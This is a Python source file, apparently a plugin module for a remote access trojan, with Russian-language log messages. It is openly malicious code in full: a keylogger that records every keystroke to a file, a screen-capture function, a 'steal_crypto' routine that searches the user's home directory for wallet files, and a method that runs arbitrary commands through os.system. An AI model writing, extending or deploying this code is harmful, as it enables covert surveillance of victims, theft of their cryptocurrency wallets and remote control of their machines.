import os, threading, time
from pynput.keyboard import Listener
from PIL import ImageGrab
from utils.logger import log

class RatPlugin:
    def __init__(self):
        self.keylog = []
        self.listener = None

    def start_keylogger(self):
        def on_press(key):
            try:
                self.keylog.append(key.char)
            except:
                self.keylog.append(str(key))
        self.listener = Listener(on_press=on_press)
        self.listener.start()
        log("[RAT] Кейлоггер запущен")

    def stop_keylogger(self):
        if self.listener:
            self.listener.stop()
        with open('keylog.txt','w') as f:
            f.write(''.join(self.keylog))
        log("[RAT] Кейлоггер остановлен, данные сохранены")

    def take_screenshot(self):
        try:
            img = ImageGrab.grab()
            img.save('screenshot_rat.png')
            log("[RAT] Скриншот сохранён")
        except Exception as e:
            log(f"[RAT] Ошибка скриншота: {e}")

    def steal_crypto(self):
        # Поиск кошельков (упрощённо)
        wallets = []
        for root, dirs, files in os.walk(os.path.expanduser("~")):
            for f in files:
                if f.endswith('.dat') or f.endswith('.wallet'):
                    wallets.append(os.path.join(root, f))
        log(f"[RAT] Найдено кошельков: {len(wallets)}")
        return wallets

    def execute(self, command):
        try:
            os.system(command)
        except Exception as e:
            log(f"[RAT] Ошибка выполнения: {e}")
